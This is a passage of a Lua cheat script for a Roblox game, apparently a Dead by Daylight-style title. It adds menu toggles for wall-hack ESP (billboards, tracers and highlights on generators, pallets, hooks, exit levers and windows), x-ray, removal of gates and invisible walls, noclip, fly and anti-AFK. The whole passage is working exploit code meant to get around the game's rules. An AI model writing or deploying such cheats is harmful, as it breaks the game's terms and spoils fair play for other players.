                        local line = Drawing.new("Line")
                        line.Visible = false
                        activeTracers[model] = line
                    end
                    
                    local line = activeTracers[model]
                    local part = findAnyVisualPart(model)
                    if part then
                        local pos, onScreen = camera:WorldToViewportPoint(part.Position)
                        if onScreen and (part.Position - root.Position).Magnitude < MAX_ESP_DISTANCE then
                            line.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y)
                            line.To = Vector2.new(pos.X, pos.Y)
                            line.Color = getGenColor(model)
                            line.Visible = true
                        else
                            line.Visible = false
                        end
                    else
                        line.Visible = false
                    end
                else
                    if activeTracers[model] then
                        activeTracers[model]:Remove()
                        activeTracers[model] = nil
                    end
                end
            end
        end)
    end
})

Tabs.Main:AddToggle("GeneratorHighlight", {
    Title = "Generator Highlight",
    Default = false,
    Callback = function(Value)
        _G.GenHighlight = Value
        if not Value then
            for model, hl in pairs(activeHighlights) do
                if hl then hl:Destroy() end
            end
            table.clear(activeHighlights)
            return
        end
        
        scanWorkspace()
        for model, _ in pairs(cachedGenerators) do
            createHighlightForModel(model)
        end
    end
})


Tabs.Main:AddParagraph({
        Title = " ",
        Content = ""
    })
    
    local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer
local camera = workspace.CurrentCamera
local MAX_ESP_DISTANCE = 3000

local cachedPallets = {}
local activeTracers = {}
local activeBillboards = {}
local activeHighlights = {}

local PALLET_COLOR = Color3.fromRGB(255, 200, 50)

local function isPallet(model)
    if not model or not model:IsA("Model") then return false end
    if Players:GetPlayerFromCharacter(model) then return false end
    if cachedPallets[model] ~= nil then return cachedPallets[model] end
    
    if model.Name == "Palletwrong" then
        cachedPallets[model] = true
        return true
    end
    
    return false
end

local function findAnyVisualPart(model)
    if model:IsA("BasePart") then return model end
    return model:FindFirstChild("HumanoidRootPart") or model:FindFirstChildWhichIsA("MeshPart", true) or model:FindFirstChildWhichIsA("Part", true) or model.PrimaryPart
end

local function scanWorkspace()
    for _, obj in pairs(workspace:GetDescendants()) do
        local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
        if model and isPallet(model) then
            cachedPallets[model] = true
        end
    end
end

scanWorkspace()

local function createBillboardForModel(model)
    if not model.Parent or activeBillboards[model] then return end
    local part = findAnyVisualPart(model)
    if part then
        local p = Instance.new("BillboardGui", model)
        p.Name = "PalletWorkspaceBillboard"
        p.Adornee = part
        p.Size = UDim2.new(0, 200, 0, 50)
        p.StudsOffset = Vector3.new(0, 4, 0)
        p.AlwaysOnTop = true
        
        local q = Instance.new("TextLabel", p)
        q.BackgroundTransparency = 1
        q.Size = UDim2.new(1, 0, 1, 0)
        q.TextColor3 = PALLET_COLOR
        q.TextStrokeTransparency = 0
        q.Text = "Pallet"
        
        activeBillboards[model] = p
        
        task.spawn(function()
            while _G.PalletBillboard and model.Parent do
                local char = localPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local dist = root and (part.Position - root.Position).Magnitude or MAX_ESP_DISTANCE
                
                p.Enabled = dist < MAX_ESP_DISTANCE
                task.wait(0.5)
            end
            p:Destroy()
            activeBillboards[model] = nil
        end)
    end
end

local function createHighlightForModel(model)
    if not model.Parent then return end
    local hl = activeHighlights[model] or model:FindFirstChild("PalletHighlightInstance")
    if not hl then
        hl = Instance.new("Highlight", model)
        hl.Name = "PalletHighlightInstance"
    end
    hl.Enabled = true
    hl.FillColor = PALLET_COLOR
    activeHighlights[model] = hl
end

workspace.DescendantAdded:Connect(function(obj)
    local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
    if model and isPallet(model) then
        cachedPallets[model] = true
        if _G.PalletBillboard then
            createBillboardForModel(model)
        end
        if _G.PalletHighlight then
            createHighlightForModel(model)
        end
    end
end)

Tabs.Main:AddToggle("PalletBillboard", {
    Title = "Pallet Billboard ESP",
    Default = false,
    Callback = function(Value)
        _G.PalletBillboard = Value
        if not Value then
            for model, p in pairs(activeBillboards) do
                if p then p:Destroy() end
            end
            table.clear(activeBillboards)
            return
        end
        
        scanWorkspace()
        for model, _ in pairs(cachedPallets) do
            createBillboardForModel(model)
        end
    end
})

Tabs.Main:AddToggle("PalletTracers", {
    Title = "Pallet Tracers",
    Default = false,
    Callback = function(Value)
        _G.PalletTracers = Value
        if not Value then
            for _, v in pairs(activeTracers) do v:Remove() end
            table.clear(activeTracers)
            if _G.PalletTracerLoop then _G.PalletTracerLoop:Disconnect() end
            return
        end
        
        _G.PalletTracerLoop = RunService.RenderStepped:Connect(function()
            local char = localPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not root then
                for _, line in pairs(activeTracers) do line.Visible = false end
                return 
            end
            
            for model, _ in pairs(cachedPallets) do
                if model.Parent then
                    if not activeTracers[model] then
                        local line = Drawing.new("Line")
                        line.Visible = false
                        activeTracers[model] = line
                    end
                    
                    local line = activeTracers[model]
                    local part = findAnyVisualPart(model)
                    if part then
                        local pos, onScreen = camera:WorldToViewportPoint(part.Position)
                        if onScreen and (part.Position - root.Position).Magnitude < MAX_ESP_DISTANCE then
                            line.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y)
                            line.To = Vector2.new(pos.X, pos.Y)
                            line.Color = PALLET_COLOR
                            line.Visible = true
                        else
                            line.Visible = false
                        end
                    else
                        line.Visible = false
                    end
                else
                    if activeTracers[model] then
                        activeTracers[model]:Remove()
                        activeTracers[model] = nil
                    end
                end
            end
        end)
    end
})

Tabs.Main:AddToggle("PalletHighlight", {
    Title = "Pallet Highlight",
    Default = false,
    Callback = function(Value)
        _G.PalletHighlight = Value
        if not Value then
            for model, hl in pairs(activeHighlights) do
                if hl then hl:Destroy() end
            end
            table.clear(activeHighlights)
            return
        end
        
        scanWorkspace()
        for model, _ in pairs(cachedPallets) do
            createHighlightForModel(model)
        end
    end
})


Tabs.Main:AddParagraph({
        Title = " ",
        Content = ""
    })

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer
local camera = workspace.CurrentCamera
local MAX_ESP_DISTANCE = 3000

local cachedHooks = {}
local activeTracers = {}
local activeBillboards = {}
local activeHighlights = {}

local HOOK_COLOR = Color3.fromRGB(255, 0, 0)

local function isHook(model)
    if not model or not model:IsA("Model") then return false end
    if Players:GetPlayerFromCharacter(model) then return false end
    if cachedHooks[model] ~= nil then return cachedHooks[model] end
    
    if model.Name == "Hook" then
        cachedHooks[model] = true
        return true
    end
    
    return false
end

local function findAnyVisualPart(model)
    if model:IsA("BasePart") then return model end
    return model:FindFirstChild("HookPoint") or model:FindFirstChildWhichIsA("MeshPart", true) or model:FindFirstChildWhichIsA("Part", true) or model.PrimaryPart
end

local function scanWorkspace()
    for _, obj in pairs(workspace:GetDescendants()) do
        local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
        if model and isHook(model) then
            cachedHooks[model] = true
        end
    end
end

scanWorkspace()

local function createBillboardForModel(model)
    if not model.Parent or activeBillboards[model] then return end
    local part = findAnyVisualPart(model)
    if part then
        local p = Instance.new("BillboardGui", model)
        p.Name = "HookWorkspaceBillboard"
        p.Adornee = part
        p.Size = UDim2.new(0, 200, 0, 50)
        p.StudsOffset = Vector3.new(0, 4, 0)
        p.AlwaysOnTop = true
        
        local q = Instance.new("TextLabel", p)
        q.BackgroundTransparency = 1
        q.Size = UDim2.new(1, 0, 1, 0)
        q.TextColor3 = HOOK_COLOR
        q.TextStrokeTransparency = 0
        q.Text = "Hook"
        
        activeBillboards[model] = p
        
        task.spawn(function()
            while _G.HookBillboard and model.Parent do
                local char = localPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local dist = root and (part.Position - root.Position).Magnitude or MAX_ESP_DISTANCE
                
                p.Enabled = dist < MAX_ESP_DISTANCE
                task.wait(0.5)
            end
            p:Destroy()
            activeBillboards[model] = nil
        end)
    end
end

local function createHighlightForModel(model)
    if not model.Parent then return end
    local hl = activeHighlights[model] or model:FindFirstChild("HookHighlightInstance")
    if not hl then
        hl = Instance.new("Highlight", model)
        hl.Name = "HookHighlightInstance"
    end
    hl.Enabled = true
    hl.FillColor = HOOK_COLOR
    activeHighlights[model] = hl
end

workspace.DescendantAdded:Connect(function(obj)
    local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
    if model and isHook(model) then
        cachedHooks[model] = true
        if _G.HookBillboard then
            createBillboardForModel(model)
        end
        if _G.HookHighlight then
            createHighlightForModel(model)
        end
    end
end)

Tabs.Main:AddToggle("HookBillboard", {
    Title = "Hook Billboard ESP",
    Default = false,
    Callback = function(Value)
        _G.HookBillboard = Value
        if not Value then
            for model, p in pairs(activeBillboards) do
                if p then p:Destroy() end
            end
            table.clear(activeBillboards)
            return
        end
        
        scanWorkspace()
        for model, _ in pairs(cachedHooks) do
            createBillboardForModel(model)
        end
    end
})

Tabs.Main:AddToggle("HookTracers", {
    Title = "Hook Tracers",
    Default = false,
    Callback = function(Value)
        _G.HookTracers = Value
        if not Value then
            for _, v in pairs(activeTracers) do v:Remove() end
            table.clear(activeTracers)
            if _G.HookTracerLoop then _G.HookTracerLoop:Disconnect() end
            return
        end
        
        _G.HookTracerLoop = RunService.RenderStepped:Connect(function()
            local char = localPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not root then
                for _, line in pairs(activeTracers) do line.Visible = false end
                return 
            end
            
            for model, _ in pairs(cachedHooks) do
                if model.Parent then
                    if not activeTracers[model] then
                        local line = Drawing.new("Line")
                        line.Visible = false
                        activeTracers[model] = line
                    end
                    
                    local line = activeTracers[model]
                    local part = findAnyVisualPart(model)
                    if part then
                        local pos, onScreen = camera:WorldToViewportPoint(part.Position)
                        if onScreen and (part.Position - root.Position).Magnitude < MAX_ESP_DISTANCE then
                            line.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y)
                            line.To = Vector2.new(pos.X, pos.Y)
                            line.Color = HOOK_COLOR
                            line.Visible = true
                        else
                            line.Visible = false
                        end
                    else
                        line.Visible = false
                    end
                else
                    if activeTracers[model] then
                        activeTracers[model]:Remove()
                        activeTracers[model] = nil
                    end
                end
            end
        end)
    end
})

Tabs.Main:AddToggle("HookHighlight", {
    Title = "Hook Highlight",
    Default = false,
    Callback = function(Value)
        _G.HookHighlight = Value
        if not Value then
            for model, hl in pairs(activeHighlights) do
                if hl then hl:Destroy() end
            end
            table.clear(activeHighlights)
            return
        end
        
        scanWorkspace()
        for model, _ in pairs(cachedHooks) do
            createHighlightForModel(model)
        end
    end
})

Tabs.Main:AddParagraph({
        Title = " ",
        Content = ""
    })

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer
local camera = workspace.CurrentCamera
local MAX_ESP_DISTANCE = 3000

local cachedLevers = {}
local activeTracers = {}
local activeBillboards = {}
local activeHighlights = {}

local LEVER_COLOR = Color3.fromRGB(0, 255, 0)

local function isExitLever(model)
    if not model or not model:IsA("Model") then return false end
    if Players:GetPlayerFromCharacter(model) then return false end
    if cachedLevers[model] ~= nil then return cachedLevers[model] end
    
    if model.Name == "ExitLever" then
        cachedLevers[model] = true
        return true
    end
    
    return false
end

local function findAnyVisualPart(model)
    if model:IsA("BasePart") then return model end
    return model:FindFirstChildWhichIsA("MeshPart", true) or model:FindFirstChildWhichIsA("Part", true) or model.PrimaryPart
end

local function scanWorkspace()
    for _, obj in pairs(workspace:GetDescendants()) do
        local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
        if model and isExitLever(model) then
            cachedLevers[model] = true
        end
    end
end

scanWorkspace()

local function createBillboardForModel(model)
    if not model.Parent or activeBillboards[model] then return end
    local part = findAnyVisualPart(model)
    if part then
        local p = Instance.new("BillboardGui", model)
        p.Name = "LeverWorkspaceBillboard"
        p.Adornee = part
        p.Size = UDim2.new(0, 200, 0, 50)
        p.StudsOffset = Vector3.new(0, 4, 0)
        p.AlwaysOnTop = true
        
        local q = Instance.new("TextLabel", p)
        q.BackgroundTransparency = 1
        q.Size = UDim2.new(1, 0, 1, 0)
        q.TextColor3 = LEVER_COLOR
        q.TextStrokeTransparency = 0
        q.Text = "Exit Lever"
        
        activeBillboards[model] = p
        
        task.spawn(function()
            while _G.LeverBillboard and model.Parent do
                local char = localPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local dist = root and (part.Position - root.Position).Magnitude or MAX_ESP_DISTANCE
                
                p.Enabled = dist < MAX_ESP_DISTANCE
                task.wait(0.5)
            end
            p:Destroy()
            activeBillboards[model] = nil
        end)
    end
end

local function createHighlightForModel(model)
    if not model.Parent then return end
    local hl = activeHighlights[model] or model:FindFirstChild("LeverHighlightInstance")
    if not hl then
        hl = Instance.new("Highlight", model)
        hl.Name = "LeverHighlightInstance"
    end
    hl.Enabled = true
    hl.FillColor = LEVER_COLOR
    activeHighlights[model] = hl
end

workspace.DescendantAdded:Connect(function(obj)
    local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
    if model and isExitLever(model) then
        cachedLevers[model] = true
        if _G.LeverBillboard then
            createBillboardForModel(model)
        end
        if _G.LeverHighlight then
            createHighlightForModel(model)
        end
    end
end)

Tabs.Main:AddToggle("LeverBillboard", {
    Title = "Exit Lever Billboard ESP",
    Default = false,
    Callback = function(Value)
        _G.LeverBillboard = Value
        if not Value then
            for model, p in pairs(activeBillboards) do
                if p then p:Destroy() end
            end
            table.clear(activeBillboards)
            return
        end
        
        scanWorkspace()
        for model, _ in pairs(cachedLevers) do
            createBillboardForModel(model)
        end
    end
})

Tabs.Main:AddToggle("LeverTracers", {
    Title = "Exit Lever Tracers",
    Default = false,
    Callback = function(Value)
        _G.LeverTracers = Value
        if not Value then
            for _, v in pairs(activeTracers) do v:Remove() end
            table.clear(activeTracers)
            if _G.LeverTracerLoop then _G.LeverTracerLoop:Disconnect() end
            return
        end
        
        _G.LeverTracerLoop = RunService.RenderStepped:Connect(function()
            local char = localPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not root then
                for _, line in pairs(activeTracers) do line.Visible = false end
                return 
            end
            
            for model, _ in pairs(cachedLevers) do
                if model.Parent then
                    if not activeTracers[model] then
                        local line = Drawing.new("Line")
                        line.Visible = false
                        activeTracers[model] = line
                    end
                    
                    local line = activeTracers[model]
                    local part = findAnyVisualPart(model)
                    if part then
                        local pos, onScreen = camera:WorldToViewportPoint(part.Position)
                        if onScreen and (part.Position - root.Position).Magnitude < MAX_ESP_DISTANCE then
                            line.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y)
                            line.To = Vector2.new(pos.X, pos.Y)
                            line.Color = LEVER_COLOR
                            line.Visible = true
                        else
                            line.Visible = false
                        end
                    else
                        line.Visible = false
                    end
                else
                    if activeTracers[model] then
                        activeTracers[model]:Remove()
                        activeTracers[model] = nil
                    end
                end
            end
        end)
    end
})

Tabs.Main:AddToggle("LeverHighlight", {
    Title = "Exit Lever Highlight",
    Default = false,
    Callback = function(Value)
        _G.LeverHighlight = Value
        if not Value then
            for model, hl in pairs(activeHighlights) do
                if hl then hl:Destroy() end
            end
            table.clear(activeHighlights)
            return
        end
        
        scanWorkspace()
        for model, _ in pairs(cachedLevers) do
            createHighlightForModel(model)
        end
    end
})

Tabs.Main:AddParagraph({
        Title = " ",
        Content = ""
    })

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer
local camera = workspace.CurrentCamera
local MAX_ESP_DISTANCE = 3000

local cachedWindows = {}
local activeTracers = {}
local activeBillboards = {}
local activeHighlights = {}

local WINDOW_COLOR = Color3.fromRGB(0, 255, 255) -- Голубой цвет для окон

local function isWindow(model)
    if not model or not model:IsA("Model") then return false end
    if Players:GetPlayerFromCharacter(model) then return false end
    if cachedWindows[model] ~= nil then return cachedWindows[model] end
    
    -- Проверка на имя Window
    if model.Name == "Window" then
        cachedWindows[model] = true
        return true
    end
    
    return false
end

local function findAnyVisualPart(model)
    if model:IsA("BasePart") then return model end
    return model:FindFirstChildWhichIsA("MeshPart", true) or model:FindFirstChildWhichIsA("Part", true) or model.PrimaryPart
end

local function scanWorkspace()
    for _, obj in pairs(workspace:GetDescendants()) do
        local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
        if model and isWindow(model) then
            cachedWindows[model] = true
        end
    end
end

scanWorkspace()

local function createBillboardForModel(model)
    if not model.Parent or activeBillboards[model] then return end
    local part = findAnyVisualPart(model)
    if part then
        local p = Instance.new("BillboardGui", model)
        p.Name = "WindowWorkspaceBillboard"
        p.Adornee = part
        p.Size = UDim2.new(0, 200, 0, 50)
        p.StudsOffset = Vector3.new(0, 4, 0)
        p.AlwaysOnTop = true
        
        local q = Instance.new("TextLabel", p)
        q.BackgroundTransparency = 1
        q.Size = UDim2.new(1, 0, 1, 0)
        q.TextColor3 = WINDOW_COLOR
        q.TextStrokeTransparency = 0
        q.Text = "Window"
        
        activeBillboards[model] = p
        
        task.spawn(function()
            while _G.WindowBillboard and model.Parent do
                local char = localPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local dist = root and (part.Position - root.Position).Magnitude or MAX_ESP_DISTANCE
                
                p.Enabled = dist < MAX_ESP_DISTANCE
                task.wait(0.5)
            end
            p:Destroy()
            activeBillboards[model] = nil
        end)
    end
end

local function createHighlightForModel(model)
    if not model.Parent then return end
    local hl = activeHighlights[model] or model:FindFirstChild("WindowHighlightInstance")
    if not hl then
        hl = Instance.new("Highlight", model)
        hl.Name = "WindowHighlightInstance"
    end
    hl.Enabled = true
    hl.FillColor = WINDOW_COLOR
    activeHighlights[model] = hl
end

workspace.DescendantAdded:Connect(function(obj)
    local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
    if model and isWindow(model) then
        cachedWindows[model] = true
        if _G.WindowBillboard then
            createBillboardForModel(model)
        end
        if _G.WindowHighlight then
            createHighlightForModel(model)
        end
    end
end)

Tabs.Main:AddToggle("WindowBillboard", {
    Title = "Window Billboard ESP",
    Default = false,
    Callback = function(Value)
        _G.WindowBillboard = Value
        if not Value then
            for model, p in pairs(activeBillboards) do
                if p then p:Destroy() end
            end
            table.clear(activeBillboards)
            return
        end
        
        scanWorkspace()
        for model, _ in pairs(cachedWindows) do
            createBillboardForModel(model)
        end
    end
})

Tabs.Main:AddToggle("WindowTracers", {
    Title = "Window Tracers",
    Default = false,
    Callback = function(Value)
        _G.WindowTracers = Value
        if not Value then
            for _, v in pairs(activeTracers) do v:Remove() end
            table.clear(activeTracers)
            if _G.WindowTracerLoop then _G.WindowTracerLoop:Disconnect() end
            return
        end
        
        _G.WindowTracerLoop = RunService.RenderStepped:Connect(function()
            local char = localPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not root then
                for _, line in pairs(activeTracers) do line.Visible = false end
                return 
            end
            
            for model, _ in pairs(cachedWindows) do
                if model.Parent then
                    if not activeTracers[model] then
                        local line = Drawing.new("Line")
                        line.Visible = false
                        activeTracers[model] = line
                    end
                    
                    local line = activeTracers[model]
                    local part = findAnyVisualPart(model)
                    if part then
                        local pos, onScreen = camera:WorldToViewportPoint(part.Position)
                        if onScreen and (part.Position - root.Position).Magnitude < MAX_ESP_DISTANCE then
                            line.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y)
                            line.To = Vector2.new(pos.X, pos.Y)
                            line.Color = WINDOW_COLOR
                            line.Visible = true
                        else
                            line.Visible = false
                        end
                    else
                        line.Visible = false
                    end
                else
                    if activeTracers[model] then
                        activeTracers[model]:Remove()
                        activeTracers[model] = nil
                    end
                end
            end
        end)
    end
})

Tabs.Main:AddToggle("WindowHighlight", {
    Title = "Window Highlight",
    Default = false,
    Callback = function(Value)
        _G.WindowHighlight = Value
        if not Value then
            for model, hl in pairs(activeHighlights) do
                if hl then hl:Destroy() end
            end
            table.clear(activeHighlights)
            return
        end
        
        scanWorkspace()
        for model, _ in pairs(cachedWindows) do
            createHighlightForModel(model)
        end
    end
})


Tabs.Main:AddSection("Alternative Settings")
    
local Toggle = Tabs.Main:AddToggle("AntiAfk", {Title = "Anti-AFK", Default = false })

    Toggle:OnChanged(function()
    local vu = game:GetService("VirtualUser")
    
    repeat wait() until game:IsLoaded() 
	   LocalPlayer.Idled:connect(function()
       game:GetService("VirtualUser"):ClickButton2(Vector2.new())
	  	vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	  	wait(1)
		  vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
     end)
 end)
 
 Options.AntiAfk:SetValue(true)

_G.NoCameraShake = false
_G.NoVignette = false

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function disableVignette()
    local currentCam = workspace.CurrentCamera
    if currentCam then
        for _, effect in pairs(currentCam:GetChildren()) do
            if effect:IsA("PostEffect") or effect.Name:lower():find("vignette") then
                effect.Enabled = not _G.NoVignette
            end
        end
    end
    if LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui") then
        for _, gui in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
            if gui:IsA("ImageLabel") and (gui.Name:lower():find("vignette") or (gui.Image and gui.Image:find("vignette"))) then
                gui.Visible = not _G.NoVignette
            end
        end
    end
end

Tabs.Main:AddToggle("NoCameraShakeToggle", {
    Title = "No Camera Shake",
    Default = false,
    Callback = function(state)
        _G.NoCameraShake = state
    end
})

Tabs.Main:AddToggle("NoVignetteToggle", {
    Title = "No Vignette",
    Default = false,
    Callback = function(state)
        _G.NoVignette = state
        disableVignette()
    end
})


Tabs.Main:AddSection("Map Modification")

 local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer

local XrayEnabled = false
local RemoveInvisWalls = false
local RemoveGatesEnabled = false

local invisibleWalls = {}
local destroyedGates = {}
local OriginalSettings = {
    Ambient = Lighting.Ambient,
    OutdoorAmbient = Lighting.OutdoorAmbient,
    GlobalShadows = Lighting.GlobalShadows
}

local function processPart(part)
    if not part:IsA("BasePart") or part:IsA("Terrain") then return end
    
    local char = LocalPlayer.Character
    if char and part:IsDescendantOf(char) then return end
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and part:IsDescendantOf(player.Character) then
            return
        end
    end

    if RemoveGatesEnabled then
        local name = part.Name:lower()
        if name:find("exit") or name == "gate" or name:find("lever") then
            if not table.find(destroyedGates, part) then
                table.insert(destroyedGates, {Part = part, Parent = part.Parent})
                part.Parent = nil
            end
        end
    end

    if RemoveInvisWalls then
        if part.CanCollide == true and part.Transparency >= 0.9 then
            if not table.find(invisibleWalls, part) then
                table.insert(invisibleWalls, {Part = part, OriginalCanCollide = part.CanCollide})
            end
            part.CanCollide = false
        end
    end

    if XrayEnabled then
        if part.Transparency < 1 then
            if not part:GetAttribute("OriginalTransparency") then
                part:SetAttribute("OriginalTransparency", part.Transparency)
            end
            part.Transparency = 0.5
        end
    end
end

local function scanWorkspace()
    for _, obj in ipairs(workspace:GetDescendants()) do
        processPart(obj)
    end
end

Tabs.Main:AddToggle("RemoveGatesToggle", {
    Title = "Remove Gates & Exits",
    Default = false,
    Callback = function(state)
        RemoveGatesEnabled = state
        if not state then
            for _, item in ipairs(destroyedGates) do
                if item.Part then item.Part.Parent = item.Parent end
            end
            table.clear(destroyedGates)
        else
            scanWorkspace()
        end
    end
})

Tabs.Main:AddToggle("RemoveInvisWallsToggle", {
    Title = "Remove Invisible Walls",
    Default = false,
    Callback = function(state)
        RemoveInvisWalls = state
        if not state then
            for _, item in ipairs(invisibleWalls) do
                if item.Part then item.Part.CanCollide = item.OriginalCanCollide end
            end
            table.clear(invisibleWalls)
        else
            scanWorkspace()
        end
    end
})

Tabs.Main:AddToggle("XrayToggle", {
    Title = "X-Ray Vision",
    Default = false,
    Callback = function(Value)
        XrayEnabled = Value
        if Value then
            OriginalSettings.Ambient = Lighting.Ambient
            OriginalSettings.OutdoorAmbient = Lighting.OutdoorAmbient
            OriginalSettings.GlobalShadows = Lighting.GlobalShadows

            Lighting.Ambient = Color3.fromRGB(255, 255, 255)
            Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
            Lighting.GlobalShadows = false
            
            scanWorkspace()
        else
            Lighting.Ambient = OriginalSettings.Ambient
            Lighting.OutdoorAmbient = OriginalSettings.OutdoorAmbient
            Lighting.GlobalShadows = OriginalSettings.GlobalShadows

            for _, desc in ipairs(workspace:GetDescendants()) do
                if desc:IsA("BasePart") then
                    local orig = desc:GetAttribute("OriginalTransparency")
                    if orig then
                        desc.Transparency = orig
                        desc:SetAttribute("OriginalTransparency", nil)
                    end
                end
            end
        end
    end
})

workspace.DescendantAdded:Connect(function(desc)
    task.wait(0.1)
    processPart(desc)
end)


Tabs.Main:AddSection("Player Modification")

_G.NoclipEnabled = false

Tabs.Main:AddToggle(
    "NoclipToggle",
    {
        Title = "Noclip",
        Default = false,
        Callback = function(state)
            _G.NoclipEnabled = state
        end
    }
)

game:GetService("RunService").Stepped:Connect(function()
    if _G.NoclipEnabled then
        local character = d.Character
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide == true then
                    part.CanCollide = false
                end
            end
        end
    end
end)


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local FLYING = false
local velocityHandlerName = "VelocityHandler"
local gyroHandlerName = "GyroHandler"
local mfly1, mfly2
local currentCharacter

local function getRoot(character)
    return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")
end

local function unmobilefly(player)
    pcall(function()
        FLYING = false
        local character = player.Character
        if character then
            local root = getRoot(character)
            if root then
                local velocityHandler = root:FindFirstChild(velocityHandlerName)
                local gyroHandler = root:FindFirstChild(gyroHandlerName)

                if velocityHandler then
                    velocityHandler:Destroy()
                end

                if gyroHandler then
                    gyroHandler:Destroy()
                end

                local humanoid = character:FindFirstChildWhichIsA("Humanoid")
                if humanoid then
                    humanoid.PlatformStand = false
                end
            end
        end

        if mfly1 then
            mfly1:Disconnect()
            mfly1 = nil
        end

        if mfly2 then
            mfly2:Disconnect()
            mfly2 = nil
        end
    end)
end

local function mobilefly(player, vfly)
    unmobilefly(player)
    FLYING = true

    local character = player.Character
    local root = getRoot(character)

    if character and root then
        local camera = workspace.CurrentCamera
        local v3none = Vector3.new()
        local v3zero = Vector3.new(0, 0, 0)
        local v3inf = Vector3.new(9e9, 9e9, 9e9)

        local controlModule = require(player.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
        local bv = Instance.new("BodyVelocity")
        bv.Name = velocityHandlerName
        bv.Parent = root
        bv.MaxForce = v3zero
        bv.Velocity = v3zero

        local bg = Instance.new("BodyGyro")
        bg.Name = gyroHandlerName
        bg.Parent = root
        bg.MaxTorque = v3inf
        bg.P = 1000
        bg.D = 2

        mfly1 = player.CharacterAdded:Connect(function()
            unmobilefly(player)
            currentCharacter = player.Character
            mobilefly(player, vfly)
        end)

        mfly2 = RunService.RenderStepped:Connect(function()
            root = getRoot(player.Character)
            camera = workspace.CurrentCamera
            if player.Character:FindFirstChildWhichIsA("Humanoid") and root and root:FindFirstChild(velocityHandlerName) and root:FindFirstChild(gyroHandlerName) then
                local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
                local VelocityHandler = root:FindFirstChild(velocityHandlerName)
                local GyroHandler = root:FindFirstChild(gyroHandlerName)

                if VelocityHandler and GyroHandler then
                    VelocityHandler.MaxForce = v3inf
                    GyroHandler.MaxTorque = v3inf

                    if not vfly and humanoid then
                        humanoid.PlatformStand = false
                    end

                    GyroHandler.CFrame = camera.CoordinateFrame
                    VelocityHandler.Velocity = v3none

                    local direction = controlModule:GetMoveVector()
                    if direction.X ~= 0 or direction.Z ~= 0 then
                        local moveVector = Vector3.new(direction.X, 0, direction.Z).unit
                        local rightVector = camera.CFrame.RightVector
                        local forwardVector = camera.CFrame.LookVector

                        local flyDirection = (rightVector * moveVector.X - forwardVector * moveVector.Z).unit

                        VelocityHandler.Velocity = flyDirection * (_G.flySpeed * 20)
                    end
                end
            end
        end)
    end
end

local function toggleFly(player, toggleValue)
    if toggleValue then
        mobilefly(player, true)
    else
        unmobilefly(player)
    end
end

_G.Fly = false
_G.flySpeed = 20 

local function flyLoop()
    while task.wait(10) do
        if _G.Fly then
            local player = LocalPlayer
            if player and player.Character then
                mobilefly(player, true)
            end
        end
    end
end

local FlyButtonToggle = Tabs.Main:AddToggle("FlyButtonToggle", {Title = "Fly (Button)", Default = false})

FlyButtonToggle:OnChanged(function(State)
    if not DFunctions then DFunctions = _G.DFunctions or shared.DFunctions end

    if State then
        local currentScale = (DConfiguration and DConfiguration.Settings and DConfiguration.Settings.GuiScale and DConfiguration.Settings.GuiScale.Fly) or 0
        
        if DFunctions and typeof(DFunctions.CreateButton) == "function" then
            DFunctions.CreateButton("FlyButton", "Fly: OFF", 0.15 + currentScale, 0.1 + currentScale, function(btn)
                _G.Fly = not _G.Fly
                toggleFly(LocalPlayer, _G.Fly)
                
                if _G.Fly then
                    btn.Text = "Fly: ON"
                else
                    btn.Text = "Fly: OFF"
                end
            end)
        else
            warn("DFunctions.CreateButton не найдена!")
        end
    else
        if DFunctions and typeof(DFunctions.DestroyButton) == "function" then
            DFunctions.DestroyButton("FlyButton")
        end
        _G.Fly = false
        toggleFly(LocalPlayer, false)
    end
end)

Tabs.Main:AddInput("FlyButtonSize", {
    Title = "Fly Gui Size",
    Default = tostring((_G.DConfiguration and _G.DConfiguration.Settings and _G.DConfiguration.Settings.GuiScale and _G.DConfiguration.Settings.GuiScale.Fly) and (_G.DConfiguration.Settings.GuiScale.Fly / 0.01) or 0),
    Placeholder = "0",
